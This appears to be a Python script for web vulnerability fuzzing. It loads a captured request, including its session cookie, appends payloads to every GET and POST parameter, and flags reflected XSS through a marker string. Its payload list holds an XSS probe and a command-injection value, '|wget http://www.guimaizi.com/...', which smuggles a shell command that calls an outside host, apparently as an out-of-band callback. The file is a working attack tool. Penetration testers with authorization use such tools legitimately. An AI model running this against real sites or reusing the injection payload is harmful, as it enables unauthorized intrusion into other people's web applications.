# coding: utf-8
'''
Created on 2018��4��18��

@author: guimaizi
'''
import json,re,requests

class test_vul:
    def __init__(self,payload):
        self.vul_payload=payload
        f = open('E:/hack/burp_lib/tmp.json', 'r', encoding='utf-8')
        test=re.sub('\'','\"',f.read())
        self.data=json.loads(test)
        print(self.data)
        if self.data['body']=='':
            #urllist=self.data['url'].split('?')
            self.get_data(self.vul_payload)
        else:
            self.post_data(self.vul_payload)
        f.close()
    def get_data(self,payload):
        urllist=self.data['url'].split('?')
        param = urllist[1]
        param_list = param.split('&')
        for i in range(len(param_list)):
            params=list(param_list)
            j = params[i].split('=')
            j[1]=j[1] + payload
            params[i]= '='.join(j)
            params= '&'.join(params)
            str=urllist[0] + '?' + params
            self.attack_get(str)
    def post_data(self,payload):
        try:
            urllist=self.data['url'].split('?')
            param = urllist[1]
            param_list = param.split('&')
            for i in range(len(param_list)):
                params=list(param_list)
                j = params[i].split('=')
                j[1]=j[1] + payload
                params[i]= '='.join(j)
                params= '&'.join(params)
                str=urllist[0] + '?' + params
                self.attack_post(str,self.data['body'])
        except:
            pass
        param_list = self.data['body'].split('&')
        for i in range(len(param_list)):
            params=list(param_list)
            j = params[i].split('=')
            j[1]=j[1] + payload
            params[i]= '='.join(j)
            params= '&'.join(params)
            #str=urllist[0] + '?' + params
            self.attack_post(self.data['url'],params)
        
    def attack_post(self,url,data):
        #print(url)
        kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
        r = requests.post(url,data,headers=kv)
        if 'xssguimaizi' in r.text:
            print('#xss:%s---%s'%(url,data))
            print(r.text)
    def attack_get(self,url):
        kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
        r = requests.get(url,headers=kv)
        if 'xssguimaizi' in r.text:
            print('#xss:'+url)
            print(r.text)
if '__main__' == __name__:
    payload=['<\'\"xssguimaizi>','|wget http://www.guimaizi.com/getdata/save_data.php?pwd=k40seKJp']
    for i in payload:
        item=test_vul(i)
    #item.attack_post('http://192.168.0.136/test_vul.php?aasdas=dsadas&xss=aa&13dsada=dsa','post_vul=dasxsssda')